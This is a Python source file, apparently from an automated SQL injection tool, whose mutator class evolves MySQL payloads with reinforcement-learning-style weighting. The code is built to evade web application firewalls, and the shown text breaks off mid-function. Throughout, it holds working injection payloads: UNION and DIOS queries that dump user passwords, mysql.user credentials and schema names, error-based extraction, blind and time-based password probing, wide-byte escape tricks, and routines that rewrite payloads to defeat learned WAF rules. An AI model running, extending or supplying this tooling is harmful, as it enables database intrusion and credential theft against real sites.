import random
import re
from core.grammar_engine import GrammarEngine

class ASTMutator:
    def __init__(self, context="GENERIC", quoteless=False, disable_strings=True):
        self.sql_keywords = [
            "UNION", "SELECT", "OR", "AND", "XOR", "WHERE", "ORDER BY", "SLEEP", 
            "GROUP BY", "FROM", "INFORMATION_SCHEMA", "DATABASE", "USER", "VERSION",
            "CONCAT", "GROUP_CONCAT", "TABLE_NAME", "COLUMN_NAME", "SCHEMA_NAME",
            "LOAD_FILE", "INTO OUTFILE"
        ]
        self.grammar = GrammarEngine()
        self.context = context
        self.quoteless = quoteless
        self.disable_strings = disable_strings
        # RL: Epsilon-Greedy parameters
        self.epsilon = 0.2  # Exploration rate
        self.strategies = {
            "logical_alts": self._logical_equivalents,
            "inline_comments": self._inline_version_comments,
            "union_balance": self._balance_union_columns,
            "column_discovery": self._discover_column_count,
            "junk_fill": self._junk_filling,
            "blind_inference": self._blind_exfiltration,
            "context_aware": self._context_aware_mutation,
            "directed_bypass": self._directed_keyword_mutation,
            "micro_fragmentation": self._micro_fragmentation,
            "nested_encoding": self._single_layer_encoding,
            "dynamic_structural": self._dynamic_structural_mutation,
            "upgrade_to_exfil": self._upgrade_to_exfil,
            "semantic_mutation": self._semantic_symbol_mutation,
            "grammar_expansion": self._grammar_expansion,
            "scientific_notation": self._scientific_notation_bypass,
            "wide_byte": self._wide_byte_injection,
            "dios_mutation": self._dios_mutation,
            "advanced_blind": self._advanced_blind_probing,
            "advanced_time": self._advanced_time_probing
        }
        # Awareness: Track success of each strategy (Q-values)
        self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
        # Priority Boost: MySQL Specific & Exfiltration Methods
        self.strategy_weights["dios_mutation"] = 4.0
        self.strategy_weights["upgrade_to_exfil"] = 4.0
        self.strategy_weights["scientific_notation"] = 3.0
        self.strategy_weights["wide_byte"] = 2.0
        
        # Gene Credit Assignment: Track reputation of each keyword
        self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
        # Point 3: Contextual Credit Assignment (Sequences)
        self.sequence_reputation = {} # Tracks pairs like (UNION, SELECT)
        
        self.last_strategy_used = None
        self.last_payload_used = None
        
        # Point 2: Curiosity-driven Exploration (ICM)
        self.response_history = [] 
        self.curiosity_reward = 0.0
        
        self.stealth_mode = False
        self.boredom_counter = 0 # Track how many samey successes we hit
        self.last_score = 0

    def apply_hint(self, hint):
        """Applies AI-driven hints to strategy weights."""
        strategy = hint.get("strategy")
        if strategy in self.strategy_weights:
            self.strategy_weights[strategy] *= 5.0
            print(f"[*] Mutator: AI Hint Applied - Boosting {strategy}", flush=True)
        
        # Keyword specific hints
        target_kw = hint.get("target_keyword")
        if target_kw in self.keyword_reputation:
            self.keyword_reputation[target_kw] = 0.1 # Force bypass for this keyword
            print(f"[*] Mutator: AI Hint Applied - Flagging {target_kw} for bypass", flush=True)

    def _strip_wrappers(self, payload):
        """Isolate core gene: Strip known outer wrappers and terminators before mutation."""
        clean = payload
        # Strip front quotes/brackets, even if stacked (e.g. ')))) )
        clean = re.sub(r"^['\"]?\)?\)?\)?\)?\}?\]?", "", clean).lstrip()
        # Ensure we strip leading spaces and generic prefix junk like '))/*junk*/ 
        clean = re.sub(r"^(?:(?:/\*.*?\*/)?[\s'\")#;]+)+", "", clean)
        
        # Strip trailing terminators
        clean = re.sub(r"(--\s*-?|#|/\*|;%00).*$", "", clean).strip()
        return clean

    def mutate(self, payload, error_msg=None, intensity=1, wrap=True):
        # Isolation Stage: Separate the Wrapper from the Core Logic
        core_gene = self._strip_wrappers(str(payload))
        mutated = core_gene
        
        # 1. Error-Based Feedback
        if error_msg:
            mutated = self._apply_error_feedback(mutated, error_msg)
            
        # 2. Strategy Selection Strategy: Exploration vs Exploitation
        num_mutations = random.randint(1, 2) * intensity
        
        for _ in range(num_mutations):
            names = list(self.strategies.keys())
            
            # --- INTELLIGENT DISCOVERY STEERING ---
            # If we are "stuck" in logical successes (boredom), force exploratory strategies
            advanced_strats = ["column_discovery", "upgrade_to_exfil", "dios_mutation", "advanced_blind", "scientific_notation"]
            
            if self.boredom_counter > 5:
                # Force an advanced move to break the local maximum
                strat_name = random.choice(advanced_strats)
                self.boredom_counter -= 1 # Decelerate boredom
            elif random.random() < self.epsilon:
                strat_name = random.choice(names)
            else:
                current_weights = dict(self.strategy_weights)
                
                # If we are in "Exfil Mode" (found a boolean bypass), boost the exfil strategies
                if self.last_score >= 0.5:
                    for s in advanced_strats:
                        current_weights[s] = current_weights.get(s, 1.0) * 10.0
                
                if self.stealth_mode:
                    current_weights["dynamic_structural"] *= 2.0
                    current_weights["micro_fragmentation"] *= 2.0
                
                weights = [current_weights.get(n, 1.0) for n in names]
                strat_name = random.choices(names, weights=weights, k=1)[0]
            
            self.last_strategy_used = strat_name
            # Safeguard: Don't mutate if it's already "too" mutated/large
            if len(mutated) > 500:
                continue
            mutated = self.strategies[strat_name](mutated)
            
        # 3. Dynamic WAF Adaptation: Evade specific patterns learned by the RL Blocker
        if hasattr(self, "active_waf_rules") and self.active_waf_rules:
            mutated = self._apply_waf_evasion(mutated, self.active_waf_rules)

        # 4. Contextual Compatibility Logic
        if wrap:
            mutated = self._context_aware_wrap(mutated)
        return mutated

    def _apply_waf_evasion(self, payload, blocked_patterns):
        """Actively breaks WAF rules learned by the Predictive Blocker."""
        mutated = str(payload)
        for pattern in blocked_patterns:
            try:
                # Find all segments matching the blocked regex pattern
                matches = list(re.finditer(pattern, mutated, re.IGNORECASE))
                if matches:
                    print(f"[*] Mutator: Active Evasion applied against learned WAF rule: {pattern}", flush=True)
                    # Replace from right to left to avoid index shifting
                    for match in reversed(matches):
                        start, end = match.span()
                        target_segment = mutated[start:end]
                        # Apply targeted obfuscation to the EXACT sub-string that triggered the rule
                        evaded_segment = self._break_regex_match(target_segment)
                        mutated = mutated[:start] + evaded_segment + mutated[end:]
            except Exception:
                pass
        return mutated

    def _break_regex_match(self, text):
        """Intelligently obfuscates a string segment to bypass structural Regex rules."""
        import random
        import re
        new_text = text
        choice = random.random()
        
        if choice < 0.3:
            # Inline Splitting: SELECT -> SE/*!!*/LECT
            words = re.findall(r'[A-Za-z]+', new_text)
            for w in set(words):
                if len(w) > 2:
                    idx = len(w) // 2
                    obfuscated = w[:idx] + "/*!!*/" + w[idx:]
                    new_text = re.sub(rf'\b{re.escape(w)}\b', obfuscated, new_text, flags=re.IGNORECASE)
        elif choice < 0.6:
            # Space Replacement: Replaces critical whitespace bridging keywords
            junk = ['/**/', '/*!50000', '%0a', '%09', '/*%00*/']
            # Only replace actual spaces to keep the syntax slightly intact
            new_text = "".join([random.choice(junk) if c == ' ' else c for c in new_text])
        elif choice < 0.85:
            # Version Comments: Wrap keywords in exec comments
            words = re.findall(r'[A-Za-z]+', new_text)
            for w in set(words):
                new_text = re.sub(rf'\b{re.escape(w)}\b', f"/*!{random.randint(40000, 60000)}{w}*/", new_text, flags=re.IGNORECASE)
        else:
            # Single URL Encoding locally
            new_text = "".join([f"%{ord(c):02x}" for c in new_text])
            
        return new_text

    def get_policy_weights(self):
        """Point 5: Export experience for Federated Learning."""
        return {
            "strategies": self.strategy_weights,
            "keywords": self.keyword_reputation,
            "sequences": self.sequence_reputation
        }

    def load_policy_weights(self, policy_data):
        """Point 5: Import experience from other islands."""
        if not policy_data: return
        # Federated Averaging / Transfer
        for k, v in policy_data.get("strategies", {}).items():
            if k in self.strategy_weights:
                self.strategy_weights[k] = (self.strategy_weights[k] + v) / 2.0
        
        for k, v in policy_data.get("keywords", {}).items():
            if k in self.keyword_reputation:
                self.keyword_reputation[k] = (self.keyword_reputation[k] + v) / 2.0
                
        # Merge sequences
        for k, v in policy_data.get("sequences", {}).items():
            current = self.sequence_reputation.get(k, 1.0)
            self.sequence_reputation[k] = (current + v) / 2.0

    def report_success(self, payload, score, status=None, state_vector=None):
        """
        Gene Credit Assignment: Update strategy and keyword reputation based on score.
        Point 1 (HER) & Point 2 (ICM) implemented here.
        """
        self.last_score = score
        
        # 1. HER & Information Gain: Learning from 403 (Forbidden)
        if status == "WAF_BLOCKED" or (status and "403" in str(status)):
            # Point 1: Treat meaningful blocks as Information Gain
            # We don't punish as hard if we got a "new" type of block (Information Gain)
            info_gain = self._calculate_curiosity(state_vector)
            score = max(score, info_gain * 0.4) # Give a small "experience" boost
        
        # 0. Boredom Check
        if score > 0.5 and score < 0.9:
            self.boredom_counter += 1
        else:
            self.boredom_counter = max(0, self.boredom_counter - 1)

        # 1. Detect if we are being blocked consistently
        if score <= 0.1:
            self.stealth_mode = True
            # Penalize keywords present in a blocked payload
            self._update_reputations(payload, -0.1)
        else:
            self.stealth_mode = False
            # Reward keywords in a successful payload
            if score > 0.5:
                self._update_reputations(payload, 0.05)

        if self.last_strategy_used and score > 0.3:
            # Reward the strategy
            boost = 0.1 * score
            if self.last_strategy_used in self.strategy_weights:
                self.strategy_weights[self.last_strategy_used] += boost
            
            # Normalize periodically
            total = sum(self.strategy_weights.values())
            if total > 0:
                for k in self.strategy_weights:
                    self.strategy_weights[k] /= total
                    self.strategy_weights[k] *= len(self.strategy_weights)

    def _update_reputations(self, payload, delta):
        """Point 3: Contextual Credit Assignment (Sequences vs Words)."""
        upper_p = payload.upper()
        found_kws = [kw for kw in self.sql_keywords if kw in upper_p]
        
        # Update individual keywords
        for kw in found_kws:
            self.keyword_reputation[kw] = max(0.1, min(2.0, self.keyword_reputation[kw] + delta))
            
        # Update Sequences (Pairs)
        if len(found_kws) >= 2:
            for i in range(len(found_kws) - 1):
                pair = (found_kws[i], found_kws[i+1])
                pair_key = f"{pair[0]}->{pair[1]}"
                current = self.sequence_reputation.get(pair_key, 1.0)
                # Sequence credit is more sensitive to failure/success than individual words
                self.sequence_reputation[pair_key] = max(0.05, min(3.0, current + (delta * 2.0)))

    def _calculate_curiosity(self, state_vector):
        """Point 2: ICM - Intrinsic Curiosity Module."""
        if not state_vector: return 0.0
        
        # Simple Curiosity: Distance from previous states
        if not self.response_history:
            self.response_history.append(state_vector)
            return 1.0 # Maximum curiosity for first discovery
            
        # Calculate distance to nearest neighbor in history
        min_dist = 1.0
        for old_state in self.response_history[-20:]: # Last 20 states
            dist = sum((a - b) ** 2 for a, b in zip(state_vector, old_state)) ** 0.5
            if dist < min_dist:
                min_dist = dist
        
        self.response_history.append(state_vector)
        # If it's a "far" state, it means the WAF reacted unpredictably!
        return min_dist

    def _directed_keyword_mutation(self, payload):
        """Directed Mutations: Apply BNF grammar expansions to Keywords."""
        mutated = payload
        for kw, rep in self.keyword_reputation.items():
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE) and (rep < 0.8 or random.random() < 0.4):
                # Use the BNF Grammar Engine for the gene expansion
                expansion = self.grammar.expand(kw, intensity=2)
                mutated = re.sub(rf'\b{kw}\b', expansion, mutated, flags=re.IGNORECASE)
        return mutated

    def _grammar_expansion(self, payload):
        """Applies the Custom Grammar Engine (BNF) to the entire payload structure."""
        return self.grammar.obfuscate_query(payload, intensity=2)

    def _apply_error_feedback(self, payload, error):
        """Applies specific mutations based on MySQL error messages from reference."""
        error_lower = error.lower()
        
        # 1. Column count mismatch (Union Based)
        if "column" in error_lower and ("count" in error_lower or "match" in error_lower):
            # Method: Iterative NULL / ORDER BY Feedback
            if "ORDER BY" in payload.upper() or "GROUP BY" in payload.upper():
                # If we hit an error with ORDER BY 5, we know it's 4.
                match = re.search(r"unknown column '(\d+)' in 'order clause'", error_lower)
                if match:
                    found_cols = int(match.group(1)) - 1
                    return f" UNION SELECT {','.join(['NULL']*found_cols)}"
            
            # Method: LIMIT INTO Method
            if "LIMIT" in payload.upper() and ("different number" in error_lower):
                parts = payload.split("INTO")
                if len(parts) > 1:
                    # Add another placeholder @
                    return f"{parts[0]} INTO {parts[1].strip()},@"

            if "UNION SELECT" in payload.upper():
                # Standard Balance
                parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
                if len(parts) >= 3:
                    cols = parts[2].split(",")
                    cols.append("NULL")
                    return f"{parts[0]}{parts[1]}{','.join(cols)}"
        
        # 2. Error-Based Upgrade: If any standard error is detected, attempt GTID_SUBSET or UPDATEXML
        if "syntax" in error_lower or "error" in error_lower:
            techniques = [
                f" AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337)",
                f" AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337)",
                f" AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~'))",
                f" AND (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))"
            ]
            clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
            return clean_payload + random.choice(techniques)

        # 3. Unknown Column Logic
        unknown_match = re.search(r"unknown column '([^']+)'", error_lower)
        if unknown_match:
            problem_token = unknown_match.group(1)
            return re.sub(rf'\b{re.escape(problem_token)}\b', "1", payload, flags=re.IGNORECASE)

        return payload

    def _upgrade_to_exfil(self, payload):
        """
        Combats Genetic Drift by forcing basic payloads (e.g., 1=1) to appended data exfiltration goals.
        Utilizes MySQL specific functions without trailing terminators so they can be wrapped properly.
        """
        original = payload.upper()
        # Clean current terminators if they exist
        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
        
        exfil_options = [
            # DIOS / Schema Extraction
            " UNION SELECT NULL,CONCAT(0x7e,USER(),0x3a,VERSION(),0x7e)",
            " UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
            " UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273",
            " UNION SELECT NULL,group_concat(user,0x3a,password) FROM users",
            " UNION SELECT NULL,group_concat(schema_name) FROM information_schema.schemata",
            
            # Password/Cred specific extraction
            " UNION SELECT NULL,password FROM users WHERE user=0x61646d696e",
            " UNION SELECT NULL,group_concat(login,0x3a,password) FROM accounts",
            
            # Error Based Prompts (Force the server to error out with data)
            " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            " AND GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION()),0x7e),1)",
            
            # Blind Exfiltration Bridge
            " AND (SELECT 1 FROM users WHERE user=0x61646d696e AND password LIKE 0x25)", # '%'
            " AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name REGEXP '^u' LIMIT 1)"
        ]
        
        # Only upgrade if it's considered a relatively simple bypass
        if "SELECT" not in original and "UNION" not in original:
            return clean_payload + random.choice(exfil_options)
        
        # If it's already a UNION, but lacks EXFIL, try to replace NULLs with something meaningful
        if "NULL" in clean_payload.upper() and random.random() < 0.4:
            return clean_payload.replace("NULL", "(SELECT version())", 1)
            
        return payload

    def _discover_column_count(self, payload):
        """Probes for column count using ORDER BY / GROUP BY."""
        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
        num = random.randint(1, 15)
        techniques = [
            f" ORDER BY {num}",
            f" GROUP BY {num}"
        ]
        return clean_payload + random.choice(techniques)

    def _blind_exfiltration(self, payload):
        """Constructs Blind SQLi patterns for Boolean/Time-based extraction."""
        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
        
        # Patterns for probing password lengths and characters
        targets = [
            # Boolean-based length check
            " AND (SELECT LENGTH(password) FROM users WHERE user=0x61646d696e)>5",
            # Boolean-based char check
            " AND (SELECT SUBSTR(password,1,1) FROM users WHERE user=0x61646d696e)=0x61", 
            # Time-based conditional
            " AND (SELECT IF(SUBSTR(password,1,1)=0x61,SLEEP(5),1) FROM users WHERE user=0x61646d696e)"
        ]
        return clean_payload + random.choice(targets)

    def _scientific_notation_bypass(self, payload):
        """WAF Bypass: Uses MySQL Scientific Notation (e-notation) to obfuscate."""
        # Replace 1=1 or similar with 1.e('')=
        mutated = payload
        mutated = re.sub(r"(\w+)\s*=\s*\1", r"1.e('')=", mutated)
        # Obfuscate keywords using the scientific notation rule from grammar
        for kw in ["SELECT", "UNION", "FROM", "WHERE"]:
            if kw in mutated.upper():
                mutated = re.sub(rf'\b{kw}\b', f"1.e({kw})", mutated, flags=re.IGNORECASE)
        return mutated

    def _wide_byte_injection(self, payload):
        """MySQL Wide Byte Injection (GBK): Uses %bf%27 to break escaping."""
        # We simulate the wide-byte prefix by appending it to the start of the payload
        # This is particularly effective if the backend uses addslashes or mysql_real_escape_string with GBK
        prefixes = ["%bf%27", "%df%27", "%8c%a8%27", "%a1%27"]
        return random.choice(prefixes) + " OR 1=1"

    def _dios_mutation(self, payload):
        """DIOS (Dump In One Shot): Advanced technique for massive data extraction.
           IMPROVED: Now supports variable column injection for better UNION compatibility.
        """
        # Patterns for exfiltration
        dios_patterns = [
            # Standard DIOS (Column Discovery)
            "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",
            # Table & Schema mapping
            "(select(@)from(select(@:=0x00),(select(@)from(information_schema.tables)where(table_schema>=@)and(@)in(@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,0x7C))))a)",
            # User and Privileges
            "(select(@)from(select(@:=0x00),(select(@)from(mysql.user)where(@)in(@:=concat(@,0x3C62723E,user,0x3a,password,0x3a,host))))a)",
            # Single-line concatenated data exfil
            "(select group_concat(schema_name,0x3a,0x3a) from information_schema.schemata)",
            # Webview Friendly DIOS
            "make_set(511,@:=0x0a,(select(1)from(information_schema.tables)where@:=make_set(511,@,0x3c6c693e,table_name)),@)"
        ]
        
        # Truncate and replace current query with DIOS pattern
        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
        
        target_pattern = random.choice(dios_patterns)
        
        if "UNION" in clean_payload.upper() and "SELECT" in clean_payload.upper():
             # If we are already in a UNION, we need to balance the columns.
             # We replace ONE NULL with our exfiltration pattern.
             if "NULL" in clean_payload.upper():
                 return clean_payload.replace("NULL", target_pattern, 1)
             return clean_payload + "," + target_pattern
             
        # If not already a union, we start one.
        return clean_payload + " UNION SELECT " + target_pattern

    def _advanced_blind_probing(self, payload):
        """Advanced Blind SQLi using MAKE_SET, LIKE, and REGEXP from reference."""
        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
        techniques = [
            " AND MAKE_SET(1<(SELECT(length(database()))),1)",
            " AND (SELECT username FROM users WHERE username REGEXP '^.{8,}$')",
            " AND products.product_name LIKE '%a%'",
            " AND (SELECT ASCII(SUBSTR(DATABASE(),1,1))) > 64"
        ]
        return clean_payload + random.choice(techniques)

    def _advanced_time_probing(self, payload):
        """Advanced Time-Based SQLi using BENCHMARK and nested SLEEP."""
        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
        techniques = [
            " AND BENCHMARK(40000000,SHA1(1337))",
            " AND (SELECT 1337 FROM (SELECT(SLEEP(5))) RANDSTR)",
            " XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR"
        ]
        return clean_payload + random.choice(techniques)

    def _context_aware_wrap(self, payload):
        """Wraps payload based on detected context (quotes, brackets).
           GRAMMAR-BASED FUZZING: Strictly adheres to the known insertion state to avoid syntax breaking.
           GENIUS TACTIC: Prioritize heavy terminator usage (--, #, %00) over balancing to truncate trailing SQL safely.
        """
        terminators = ["-- -", "#", ";%00", "/*"]
        chosen_term = random.choice(terminators) if random.random() < 0.8 else ""

        if self.quoteless or self.disable_strings:
            # The target specifically filters/escapes quotes (e.g. ' -> / or \). 
            # We absolutely avoid sending ANY quotes.
            if self.context in ["SINGLE_QUOTE", "DOUBLE_QUOTE", "GENERIC"]:
                 # Relying on backslash escape trick to break out of string context implicitly
                 # Fix: Avoid backslash explosion (don't stack if already present)
                 prefix = "\\" if not payload.startswith("\\") else ""
                 return prefix + payload + chosen_term
            return payload + chosen_term

        if self.context == "NUMERIC":
            return payload + chosen_term
            
        if self.context == "SINGLE_QUOTE":
            return "'" + payload + chosen_term
            
        if self.context == "DOUBLE_QUOTE":
            return '"' + payload + chosen_term
            
        if self.context == "SINGLE_QUOTE_PARENTHESIS":
            return "')" + payload + chosen_term

        # Generic Random Fallback
        if random.random() > 0.4:
            wrappers = [
                ("'", chosen_term),
                ('"', chosen_term),
                ("') ", chosen_term),
                ('") ', chosen_term)
            ]
            prefix, suffix = random.choice(wrappers)
            return prefix + payload + suffix
            
        return payload + chosen_term

    def _tokenize(self, payload):
        """A lexical analyzer exclusively designed for MySQL's dialect and idiosyncrasies."""
        token_specification = [
            ('EXEC_COMMENT', r"/\*![0-9]{5}.*?\*/"),       # Executable comment (MySQL specific)
            ('COMMENT',      r"/\*.*?\*/|--\s[^\n]*|#[^\n]*"), # Standard/MySQL comments (Note: -- needs space after)
            ('HEX_BIT',      r"0[xX][0-9a-fA-F]+|0[bB][01]+|[xX]'[0-9a-fA-F]+'|[bB]'[01]+'"), # Hex/Bit literals
            ('STRING',       r"'[^']*'|\"[^\"]*\""),       # MySQL allows both single and double quotes
            ('SYS_VAR',      r"@@[a-zA-Z_0-9]+"),          # System variables
            ('VAR',          r"@[a-zA-Z_0-9]+"),           # User variables
            ('KEYWORD',      r"\b(SELECT|UNION|ALL|OR|AND|XOR|WHERE|FROM|DATABASE|USER|VERSION|ORDER\s+BY|GROUP\s+BY|LIMIT|OFFSET|HAVING|SLEEP|BENCHMARK|CONNECTION_ID|LOAD_FILE|INTO\s+OUTFILE|DUMPFILE)\b"),
            ('NUMBER',       r"\b\d+(\.\d+)?([eE][+-]?\d+)?\b"), # MySQL numbers (integers, floats, scientific)
            ('OPERATOR',     r"<=>|:=|<=|>=|!=|<>|=|\+|-|\*|/|%|\|\||&&|<<|>>|&|\||\^|~|SOUNDS\s+LIKE|\bLIKE\b|\bIN\b|\bIS\b"),
            ('BACKTICK_ID',  r"`[^`]*`"),                  # MySQL identifiers surrounded by backticks
            ('IDENTIFIER',   r"\b[a-zA-Z_][a-zA-Z0-9_$]*\b"),
            ('SYMBOL',       r"[(),;.]"),
            ('WHITESPACE',   r"[ \t\n\r]+"),
            ('MISC',         r"."),
        ]
        tok_regex = '|'.join('(?P<%s>%s)' % pair for pair in token_specification)
        get_token = re.compile(tok_regex, re.IGNORECASE).match
        pos = 0
        tokens = []
        while pos < len(payload):
            match = get_token(payload, pos)
            if not match: break
            type_str = match.lastgroup
            val = match.group(type_str)
            tokens.append({"type": type_str, "value": val})
            pos = match.end()
        return tokens

    def _analyze_semantics(self, tokens):
        """
        Deep Semantic Awareness (The 'Human Thought' Layer)
        Analyzes tokens in context to understand *why* they are used, what they mean,
        and what grammatical rules apply to their neighbors.
        """
        for i, tok in enumerate(tokens):
            prev_tok = tokens[i-1] if i > 0 else None
            next_tok = tokens[i+1] if i < len(tokens) - 1 else None
            
            # Default missing elements
            tok['role'] = 'UNKNOWN'
            tok['neighbors'] = {'prev': prev_tok['type'] if prev_tok else None, 
                                'next': next_tok['type'] if next_tok else None}

            if tok['type'] == 'KEYWORD':
                val = tok['value'].upper()
                if val in ['SELECT', 'UNION', 'WHERE', 'FROM', 'ORDER BY', 'GROUP BY', 'HAVING']:
                    tok['role'] = 'CLAUSE_STARTER' # Defines the structure of the query block
                elif val in ['AND', 'OR', 'XOR', '&&', '||']:
                    tok['role'] = 'LOGICAL_JUNCTION' # Bridges expressions
                elif next_tok and next_tok['value'] == '(':
                    tok['role'] = 'FUNCTION_CALL' # It's executing an action
                else:
                    tok['role'] = 'COMMAND'

            elif tok['type'] == 'IDENTIFIER':
                if prev_tok and prev_tok['value'].upper() in ['FROM', 'JOIN']:
                    tok['role'] = 'TABLE_NAME'
                elif prev_tok and prev_tok['value'].upper() == 'BY':
                    tok['role'] = 'COLUMN_INDEX'
                elif next_tok and next_tok['type'] == 'OPERATOR':
                    tok['role'] = 'COMPARISON_TARGET' # It's a column being compared
                else:
                    tok['role'] = 'COLUMN_NAME'
                    
            elif tok['type'] == 'OPERATOR':
                tok['role'] = 'COMPARATOR'
                
            elif tok['type'] in ['STRING', 'NUMBER', 'HEX_BIT']:
                tok['role'] = 'LITERAL_VALUE' # Static data injection
                
        return tokens

    def _build_ast(self, tokens):
        """
        AST Builder: Converts a flat list of semantically tagged tokens into a hierarchical Abstract Syntax Tree.
        Groups into [CLAUSES] -> [EXPRESSIONS] -> [LITERALS/OPERATORS]
        """
        tokens = self._analyze_semantics(tokens)
        ast = {"type": "ROOT", "children": []}
        current_node = ast
        stack = []
        
        for tok in tokens:
            if tok['type'] == 'KEYWORD' and tok['value'].upper() in ['SELECT', 'UNION', 'WHERE', 'FROM', 'ORDER BY']:
                # New clause starts
                new_clause = {"type": "CLAUSE", "name": tok['value'].upper(), "children": [tok]}
                ast["children"].append(new_clause)
                current_node = new_clause
            elif tok['value'] == '(':
                # Start of expression/group
                new_group = {"type": "EXPRESSION_GROUP", "children": [tok]}
                current_node["children"].append(new_group)
                stack.append(current_node)
                current_node = new_group
            elif tok['value'] == ')':
                # End of expression
                current_node["children"].append(tok)
                if stack:
                    current_node = stack.pop()
            else:
                if "children" not in current_node:
                    current_node["children"] = []
                current_node["children"].append(tok)
                
        return ast

    def _traverse_and_mutate_ast(self, node):
        """Walks the AST and applies Grammar-Safe mutations based on the Semantic Dictionary."""
        result = ""
        
        # 2. Semantic Dictionary using MySQL Specific Dialect
        semantic_dict = {
            "OPERATORS": {
                "=": [" LIKE ", " IN ", " = ", "<=>"], # <=> is MySQL's null-safe equal mapping
                ">": [" >= ", " > "],
                "||": [" OR ", " || "],
                "&&": [" AND ", " && "],
                "!=": [" <> ", " != "]
            },
            "LOGICAL_FUNCTIONS": {
                "SLEEP": ["BENCHMARK(1000000,MD5(1))", "SLEEP"],
                "DATABASE": ["SCHEMA", "DATABASE()", "DATABASE"],
                "VERSION": ["@@VERSION", "VERSION()", "@@GLOBAL.version"],
                "USER": ["SYSTEM_USER()", "SESSION_USER()", "CURRENT_USER()", "USER()"]
            }
        }

        if isinstance(node, dict) and node.get("type") in ["ROOT", "CLAUSE", "EXPRESSION_GROUP"]:
            for child in node.get("children", []):
                result += self._traverse_and_mutate_ast(child)
            return result
            
        elif isinstance(node, dict) and "type" in node and "value" in node:
            t_type = node['type']
            val = node['value']
            role = node.get('role', 'UNKNOWN')
            
            # Semantic Mutation Logic powered by Human-Like Context Awareness
            
            # --- 1. Role-based Logic ---
            if role == 'LOGICAL_JUNCTION' and random.random() < 0.5:
                val = self.grammar.expand(val.upper(), intensity=2)
                
            elif role == 'FUNCTION_CALL' and random.random() < 0.4:
                # Insert spaces/comments before parenthesis safely
                sep = self.grammar.expand("WHITESPACE", intensity=2)
                val = f"{val}{sep}"
                
            elif role == 'TABLE_NAME' and random.random() < 0.3:
                # Table names can be safely backticked or combined with database name (schema bypass)
                if not val.startswith("`"):
                    val = f"`{val}`"
                    
            elif role == 'COLUMN_NAME' and random.random() < 0.3:
                # Similar to table names but we can inject table alias prefixes if we want to confuse
                if not val.startswith("`"):
                    val = f"`{val}`"
            
            # --- 2. Type-based Fallback Logic ---
            if t_type == 'OPERATOR':
                if random.random() < 0.3:
                    val = self.grammar.expand("EQUALS" if val == "=" else val, intensity=2)
                    
            elif t_type == 'KEYWORD' and role not in ['LOGICAL_JUNCTION', 'FUNCTION_CALL']:
                if random.random() < 0.6:
                    val = self.grammar.expand(val.upper(), intensity=2)
                    
            elif t_type == 'STRING' and role == 'LITERAL_VALUE':
                inside = val[1:-1]
                
                if self.disable_strings:
                    # Temporary bypass to completely avoid string injection parsing by dropping them to truthy ints.
                    return "1"

                if self.quoteless:
                    # STRICT QUOTELESS MODE: Convert all strings to Hex or Char() equivalents
                    # Fallback to standard Hex directly 
                    val = "0x" + "".join([f"{ord(c):02x}" for c in inside])
                else:    
                    coin = random.random()
                    if coin < 0.2:
                        if re.match(r"^[a-zA-Z0-9_]+$", inside): 
                            val = "0x" + "".join([f"{ord(c):02x}" for c in inside])
                    elif coin < 0.4 and len(val) > 4:
                        # 'adm' 'in' concatenation
                        quote_char = val[0]
                        mid = len(inside) // 2
                        val = f"{quote_char}{inside[:mid]}{quote_char} {quote_char}{inside[mid:]}{quote_char}"
                    
            elif t_type == 'IDENTIFIER' and role not in ['TABLE_NAME', 'COLUMN_NAME']:
                if not val.startswith("`") and random.random() < 0.4:
                    val = f"`{val}`"

            elif t_type == 'WHITESPACE':
                if random.random() < 0.5:
                    val = self.grammar.expand("WHITESPACE", intensity=2)
                    
            return val
        
        return ""

    def _semantic_symbol_mutation(self, payload):
        """Mutates based on true structural understanding (AST generation & traversal)."""
        tokens = self._tokenize(payload)
        ast = self._build_ast(tokens)
        return self._traverse_and_mutate_ast(ast)

    def _inline_version_comments(self, payload):
        mutated = payload
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                rand_ver = random.randint(40000, 60000)
                mutated = re.sub(rf'\b{kw}\b', f"/*!{rand_ver}{kw}*/", mutated, flags=re.IGNORECASE)
        return mutated

    def _logical_equivalents(self, payload):
        equivalents = {
            r"1=1": ["true", "not false", "~0", "0<=>0", "1<=>1", "0x31<=>0x31", "(SELECT 1)<=>1", "8=8", "1*56=56"],
            r"1=2": ["false", "not true", "1<=>0", "0<=>1", "(SELECT 1)<=>0", "1-true=0"],
            r"\bOR\b": ["||", "XOR", "OR 1<=>1", "OR true", "OR (SELECT 1)"],
            r"\bAND\b": ["&&", "AND 1<=>1", "AND (SELECT 1)"],
            r"\bXOR\b": ["OR", "||", "XOR true", "XOR 1<=>1"],
            r"\btrue\b": ["1<=>1", "not 0", "XOR false", "(SELECT 1)"],
